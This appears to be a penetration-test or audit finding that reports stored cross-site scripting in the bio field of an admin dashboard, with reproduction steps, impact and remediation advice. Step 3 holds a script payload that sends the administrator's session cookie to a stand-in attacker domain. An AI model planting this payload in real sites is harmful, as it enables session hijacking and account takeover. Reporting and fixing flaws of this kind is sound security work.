Stored XSS in Admin Dashboard

Critical
CVSS Score9.8
CWECWE-79: Cross-site Scripting
Hostadmin.example.com
Port443
EndpointPOST /api/users
Parameterbio field in user profile

Description

The bio field in user profiles lacks input sanitization, allowing arbitrary HTML and JavaScript to be stored. When an administrator views the user list, the malicious payload executes in their browser context.

Reproduction Steps

  1. Login as a regular user.
  2. Navigate to Profile Settings.
  3. In the Bio field, enter the following payload: 
    <script>document.location='https://evil.com/?c='+document.cookie</script>
  4. Save the profile.
  5. As an administrator, navigate to the user list at /admin/users.
  6. The XSS payload fires, exfiltrating the admin's session cookie to the attacker-controlled domain.

Impact

Full administrator account takeover. An attacker can:

  • Access all user data across the platform.
  • Modify system configuration.
  • Persist access via session hijacking or account modification.

Remediation

  • Implement server-side input validation and sanitization for all user-supplied fields.
  • Apply Context-Aware Output Encoding (CWE-116) when rendering user content in HTML.
  • Enforce a Content Security Policy (CSP) to mitigate script execution.
  • Use HttpOnly and Secure flags on session cookies.
